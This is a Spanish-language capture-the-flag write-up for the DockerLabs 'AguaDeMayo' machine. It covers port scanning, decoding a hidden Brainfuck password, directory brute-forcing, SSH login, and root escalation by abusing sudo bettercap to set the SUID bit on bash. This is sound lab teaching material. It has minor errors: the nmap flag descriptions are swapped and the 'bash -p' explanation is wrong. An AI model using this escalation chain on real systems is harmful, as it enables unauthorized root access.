## WRITEUP DE LA MÁQUINA AGUADEMAYO DE DOCKERLABS EN ESPAÑOL

Sitio web - https://dockerlabs.es/#/

Hacemos un escaneo de puertos mediante la herramienta nmap, esto casi siempre es el comienzo para la resolución de una máquina o CTF.

```shell
└─$ nmap -sV -sC 172.17.0.2 -oN outputscan.txt
```
"-sC" Muestra la versión del servicio del puerto abierto.
<br><br>
"-sV" Ejecuta scripts propios de Nmap que, entre otras cosas, descubren información detallada sobre los servicios.
<br><br>
"172.18.0.2" Es la dirección IP de la máquina víctima.
<br><br>
"-oN outputscan.txt" Sirve para que te copie el resultado del escaneo en el fichero que tú le indiques (no hay que crearlo antes, lo crea solo). Esto lo hago por si más tarde quiero volver a ver el escaneo pero no quiero tener que hacerlo de nuevo.

---

> En este caso no he utlizado ni "-p-", ni "-n", ni "--min-rate 5000" ya que para algo tan sencillo es más eficaz y rapido ejecutar un comando más corto.

---

```
─$ nmap -sC -sV 172.17.0.2 -oN outputscan.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 03:11 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 172.17.0.2
Host is up (0.00015s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 75:ec:4d:36:12:93:58:82:7b:62:e3:52:91:70:83:70 (ECDSA)
|_  256 8f:d8:0f:2c:4b:3e:2b:d7:3c:a2:83:d3:6d:3f:76:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```

Vemos que el puerto 22 y 80 de los servicios ssh y http respectivamente estan abiertos. Empezaremos por ver que sitio web encontramos con la IP víctima (172.17.0.2):

![pagina web](https://github.com/user-attachments/assets/6c91aa72-6b41-4795-bd48-5be16dc12001)

Vemos que es una página web sencilla, como costrumbre reviso el código fuente con ```Ctrl + u```. Si no eres observador veras un código normal sin nada raro, peo cuando llegas a las últimas lineas vemos que todavía se puedo hacer mucho más scroll hacia abajo, y que vemos...?

```
<!--
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
-->
```

Es normal no entender que sígnifican tantos caracteres pero si lo buscas en algun navegador o en alguna IA, te diran que es el lenguage de programación conocido como Brainfuck. Metiendo este codigo (Sin el ```<!-- y -->``` del principio y final, eso es solo para hacer un comentario en HTML) un decodificador que he encontrado (https://www.dcode.fr/brainfuck-language) nos muestra que dicho código significa: "bebeaguaqueessano". <br><br>
Tenemos lo que posiblemente sea una contraseña. Vamos ahora a buscar directorios ocultos en esta página web para ver si podemos encontrar algo, algún nombre de usuario, algún archivo o algo. Lo haremos mediante la herramienta Gobuster.

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```
El modo dir indica que Gobuster realizará una enumeración de directorios y archivos.
<br><br>
"-u" Especifica la URL del objetivo que Gobuster escaneará. En este caso, el objetivo es http://172.17.0.2/.
<br><br>
"-w" Especifica la lista de palabras (wordlist) que Gobuster usará para la fuerza bruta. La lista de palabras contiene nombres de directorios y archivos comunes que Gobuster intentará encontrar en el servidor web. Aquí se está utilizando una lista de palabras proporcionada por DirBuster, llamada directory-list-2.3-medium.txt.
<br><br>
El resultado:

```
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://172.17.0.2/images/]
/server-status        (Status: 403) [Size: 275]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Tenemos un directorio oculto en la página llamado "images", lo ponemos en el navegador y vemos:

![Foto directorio images](https://github.com/user-attachments/assets/658bcb1b-7249-42ba-901d-ee6a24359f79)

Probe a descargar los datos y buscar información en los metadatos pero nada, es mucho más simple. Teniendo el nombre de la foto, "agua_ssh.jpg" me dice que el usuario al que debo hacer ssh es "agua" y su contraseña debería ser "bebeaguaqueessano".

```
ssh agua@172.17.0.2
```

Hacemos un `Sudo -l` para escalar privilegios, vemos que podemos ejecutar el binario bettercap. Lo ejecutamos mediante `sudo /usr/bin/bettercap` y nos sale:

```
agua@fb7a55388ca1:~$ sudo /usr/bin/bettercap 
bettercap v2.32.0 (built for linux amd64 with go1.19.8) [type 'help' for a list of commands]

172.17.0.0/16 > 172.17.0.2  » [08:16:10] [sys.log] [war] exec: "ip": executable file not found in $PATH
172.17.0.0/16 > 172.17.0.2  »  
```

Si escribimos help nos sale una lista de comandos y cosas que podemos ejecutar, vemos que para ejecutar comandos por la shell hay que poner un ! delante del comando:

![bettercap](https://github.com/user-attachments/assets/7bcff637-0ac9-40de-9d86-17274705f825)

Le vamos a dar al binario bash el permiso SUID (activar el bit SUID) y así poder ejecutar bash con los permisos de root sin serlo. Para ello escribimos ```chmod u+s /usr/bin/bash```;
<br><br>
"chmod" -> (change mode) es el comando para cambiar permisos.
<br>
"u" -> Cace referencia a "user", significa que cambiaremos permisos a user.
<br>
"+" -> Con el más conseguimos agregar los permisos que indiquemos.
<br>
"s" -> Hace referencia al permiso SUID (Set User ID), activa dicho bit.
<br>
"/usr/bin/bash" -> Esta es la ruta a la que vamos a sumar los permisos.
<br><br>
Salimos al usuario de agua con ```exit``` y escribimos ```bash -p``` (Usar bash -p te proporciona una shell de root, pero sin arriesgarte a heredar permisos SUID de otros binarios o de la shell en la que estabas trabajando.)

```
agua@fb7a55388ca1:~$ bash -p
bash-5.2# whoami
root          
```

Somos root, muchas gracias por seguir este writeup, nos vemos en la próxima!! 😊
